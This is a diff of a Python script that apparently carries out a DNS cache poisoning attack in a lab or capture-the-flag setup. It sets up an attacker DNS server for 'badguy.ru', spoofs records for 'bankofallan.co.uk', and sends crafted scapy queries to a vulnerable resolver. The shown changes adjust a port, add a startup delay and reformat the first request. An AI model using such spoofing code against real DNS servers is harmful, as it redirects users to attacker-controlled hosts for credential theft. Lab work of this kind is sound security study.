@@ -31,7 +31,7 @@ TARGET_IP = "192.168.56.101"  # vulnDNS's IP
 TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request
 
 BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
-BAD_DNS_SERVER_PORT = 5553  # DNS endpoint port of badguy.ru (also present on config.json)
+BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)
 
 SPOOFED_DNS = "192.168.56.100"
 URL_TO_POISON = "bankofallan.co.uk"
@@ -125,6 +125,9 @@ def flag_victory_listener():
         sys.exit(0)
 
 
+TIME_SLEEP_SECONDS = 5  # 5 seconds delay
+
+
 def main():
     print("Initializing attack...")
     dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
@@ -135,11 +138,14 @@ def main():
     print("Starting listener to get victory flag")
     flag_victory_thread.start()
 
+    print("Sleeping for 5 seconds to allow DNS sniff startup")
+    time.sleep(TIME_SLEEP_SECONDS)
+
     # point 1: send a dns request for badguy.ru
     print("Sending first request to " + TARGET_IP +
           " asking for badguy.ru to get an initial queryId and port with our DNS")
-    first_dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1,  # recursion desired
-                                                                             qd=DNSQR(qname=DNS_URL_BADGUY))
+    # rd = 1, recursion desired
+    first_dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=DNS_URL_BADGUY))
 
     send(first_dns_req, verbose=0)
 
